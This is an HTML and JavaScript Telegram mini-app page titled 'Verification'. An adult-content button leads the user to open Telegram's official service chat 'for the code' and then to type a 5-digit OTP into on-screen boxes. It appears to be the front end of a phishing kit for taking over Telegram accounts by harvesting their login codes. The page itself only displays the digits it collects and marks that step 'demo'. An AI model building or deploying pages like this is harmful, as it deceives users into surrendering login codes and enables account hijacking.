<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body {
    margin: 0;
    font-family: Arial;
    background: #000;
    color: white;
    display: flex;
    justify-content: center;
    align-items: flex-end;
    height: 100vh;
}

.container {
    width: 90%;
    max-width: 350px;
    margin-bottom: 50px;
    text-align: center;
}

.btn {
    background: #ff4757;
    padding: 18px;
    border: none;
    border-radius: 15px;
    color: white;
    font-size: 18px;
    width: 100%;
    margin-top: 10px;
}

.hidden { display: none; }

.otp-box {
    display: flex;
    gap: 8px;
    justify-content: center;
    margin: 20px 0;
}

.otp {
    width: 40px;
    height: 50px;
    background: #222;
    text-align: center;
    font-size: 25px;
    line-height: 50px;
    border-radius: 8px;
}
</style>
</head>

<body>

<div class="container">

    <!-- STEP 1 -->
    <div id="step1">
        <button class="btn" onclick="start()">🍓 Start Continue 🔞</button>
    </div>

    <!-- STEP 2 -->
    <div id="step2" class="hidden">
        <button class="btn" onclick="openTelegramChat()">📩 Get Code</button>
    </div>

    <!-- STEP 3 -->
    <div id="step3" class="hidden">
        <p>Enter OTP</p>

        <div class="otp-box">
            <div class="otp" id="b1"></div>
            <div class="otp" id="b2"></div>
            <div class="otp" id="b3"></div>
            <div class="otp" id="b4"></div>
            <div class="otp" id="b5"></div>
        </div>
    </div>

</div>

<script>
let tg = window.Telegram.WebApp;
tg.expand();

let currentOTP = "";

// STEP 1 → STEP 2
function start() {
    document.getElementById("step1").classList.add("hidden");
    document.getElementById("step2").classList.remove("hidden");
}

// 👉 GET CODE CLICK
function openTelegramChat() {
    tg.showAlert("Check your Telegram messages for the code 📩");

    // Telegram chat open (mini app background এ যাবে)
    setTimeout(() => {
        window.location.href = "tg://resolve?domain=Telegram";
    }, 700);

    // এরপর OTP screen show
    setTimeout(() => {
        document.getElementById("step2").classList.add("hidden");
        document.getElementById("step3").classList.remove("hidden");
    }, 1500);
}

// OTP INPUT (demo)
document.addEventListener("keydown", (e) => {
    if (!isNaN(e.key) && currentOTP.length < 5) {
        currentOTP += e.key;
        updateBoxes();
    }
});

function updateBoxes() {
    for (let i = 1; i <= 5; i++) {
        document.getElementById("b" + i).innerText = currentOTP[i-1] || "";
    }
}
</script>

</body>
</html>
